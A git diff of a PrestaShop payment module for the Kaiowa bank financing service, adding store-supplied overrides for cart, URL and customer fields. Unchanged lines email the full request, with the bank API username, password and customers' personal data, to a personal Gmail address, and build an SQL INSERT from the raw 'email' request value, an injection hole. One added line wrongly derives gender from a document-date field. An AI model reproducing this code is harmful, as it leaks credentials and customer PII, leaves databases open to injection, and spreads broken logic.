@@ -168,29 +168,45 @@ class Ps_Kaiowa extends PaymentModule
     }
 
     public function hookDisplayExpressCheckout($params){
-        $total = (float)$this->context->cart->getOrderTotal(true, Cart::BOTH);
+
+        $total = $params['storecart']
+            ? (float)$params['storecart']->getOrderTotal(true, Cart::BOTH)
+            : (float)$this->context->cart->getOrderTotal(true, Cart::BOTH);
+        $url_comercio = $params['storeurl']
+            ? $params['storeurl']
+            : $this->context->link->getPageLink('cart').'?action=show&checkout';
+        $nro_documento = $params['storedoc']
+            ? $params['storedoc']
+            : $this->context->customer->document;
+        $cart_id = $params['storecartid']
+            ? $params['storecartid']
+            : $this->context->cart->id;
+
         $request = array(
             "cid" =>  Configuration::get('BANK_KAIOWA_CID'),
-            "url_comercio" =>  $this->context->link->getPageLink('cart').'?action=show&checkout',
+            "url_comercio" =>  $url_comercio,
             "api_response_ecommerce" => $this->context->link->getModuleLink('ps_kaiowa', 'responses',array('type' => 'cart')),
-            "nro_documento" => $this->context->customer->document,
+            "nro_documento" => $nro_documento,
             "login" => Configuration::get('BANK_KAIOWA_USER'),
             "pass" => Configuration::get('BANK_KAIOWA_PASSWORD'),
             "c_sucursal" =>  "1",
-            "id_transaccion" => $this->context->cart->id,
+            "id_transaccion" => $cart_id,
             "valor_financiar" =>  ($total * Configuration::get('BANK_KAIOWA_CUOTAS'))
         );
-
         $urlRequest = str_replace(
             'JSON',
             $this->base64url_encode(utf8_encode(Tools::jsonEncode($request))),
             Configuration::get('BANK_KAIOWA_URL_CREACION')
         );
+        if(!empty($params['storecart'])) {
+            return $urlRequest;
+        }
         $this->smarty->assign(array(
             'url' => $urlRequest
         ));
 
         return $this->display(__FILE__, 'views/templates/hook/hookDisplayExpressCheckout.tpl');
+
     }
 
     public function hookActionFrontControllerSetVariables() {
@@ -326,7 +342,7 @@ class Ps_Kaiowa extends PaymentModule
                         'a_login' => Configuration::get('BANK_KAIOWA_USER'),
                         'a_password' => Configuration::get('BANK_KAIOWA_PASSWORD'),
                         'a_id_marca' => Configuration::get('BANK_KAIOWA_URL_MARCA'),
-                        'a_documento' => $this->context->customer->document                        
+                        'a_documento' => $params['document'] ? $params['document'] : $this->context->customer->document                        
                     );
                     $opts['http']['method'] = 'post';
                     $opts['http']['content'] = json_encode($request);
@@ -461,20 +477,25 @@ class Ps_Kaiowa extends PaymentModule
             $customer = $params['customer'];
             $customer->active = 0;
             $customer->update();
+            if (empty($params['redirect'])) {
+                $redirect = $this->context->link->getModuleLink('ps_kaiowa', 'balance');
+            } else {
+                $redirect = $params['redirect'];
+            }
             $request = array(
                 "cid" =>  Configuration::get('BANK_KAIOWA_CID'),
-                "url_comercio" =>  $this->context->link->getModuleLink('ps_kaiowa', 'balance'),
+                "url_comercio" => $redirect,
                 "api_response_ecommerce" => $this->context->link->getModuleLink('ps_kaiowa', 'responses',array('type' => 'user')),
-                "tipo_documento" =>  Tools::getValue('document_type'),
-                "nro_documento" =>  Tools::getValue('document'),
-                "primer_nombre" =>  Tools::getValue('firstname'),
-                "segundo_nombre" =>  Tools::getValue('firstname2'),
-                "primer_apellido" =>  Tools::getValue('lastname'),
-                "segundo_apellido" =>  Tools::getValue('lastname2'),
-                "f_nacimiento" =>  Tools::getValue('birthday'),
-                "f_expedicion_documento" =>  Tools::getValue('f_exped'),
-                "email" =>  Tools::getValue('email'),
-                "genero" =>  Tools::getValue('id_gender') ? 'M' : 'F',
+                "tipo_documento" =>  Tools::getValue('document_type') ? Tools::getValue('document_type') : $customer->document_type,
+                "nro_documento" =>  Tools::getValue('document') ? Tools::getValue('document') : $customer->document,
+                "primer_nombre" =>  Tools::getValue('firstname') ? Tools::getValue('firstname') : $customer->firstname,
+                "segundo_nombre" =>  Tools::getValue('firstname2') ? Tools::getValue('firstname2') : $customer->firstname2,
+                "primer_apellido" =>  Tools::getValue('lastname') ? Tools::getValue('lastname') : $customer->lastname,
+                "segundo_apellido" =>  Tools::getValue('lastname2') ? Tools::getValue('lastname2') : $customer->lastname2,
+                "f_nacimiento" =>  Tools::getValue('birthday') ? Tools::getValue('birthday') : $customer->birthday,
+                "f_expedicion_documento" =>  Tools::getValue('f_exped') ? Tools::getValue('f_exped') : $customer->f_exped,
+                "email" =>  Tools::getValue('email') ? Tools::getValue('email') : $customer->email,
+                "genero" =>  Tools::getValue('id_gender') ? (Tools::getValue('id_gender') == 1 ? 'M' : 'F') : ($customer->f_exped == 1 ? 'M' : 'F'),
                 "c_sucursal" =>  "1",
                 "login" => Configuration::get('BANK_KAIOWA_USER'),
                 "pass" =>  Configuration::get('BANK_KAIOWA_PASSWORD'),
@@ -488,7 +509,10 @@ class Ps_Kaiowa extends PaymentModule
                 Configuration::get('BANK_KAIOWA_URL_CUPO')
             );
             mail('sebasca5gz@gmail.com','REQUEST USER KAIOWA','--- '.$urlRequest.' -- '.print_r($request,true));
-            setcookie('USER_CREATE_TRANSACTION',$customer->id.'|'.$this->context->cart->id, time()+3600);
+
+            if (empty($params['from-store'])) {
+                setcookie('USER_CREATE_TRANSACTION',$customer->id.'|'.$this->context->cart->id, time()+3600);
+            }
             Db::getInstance()->execute('INSERT INTO '._DB_PREFIX_.'kaiowa_validations (`id_customer`,`id_cart`,`email`) VALUES ('.$customer->id.', '.$id_cart.',"'.Tools::getValue('email').'")');
             return $urlRequest;
         } else {
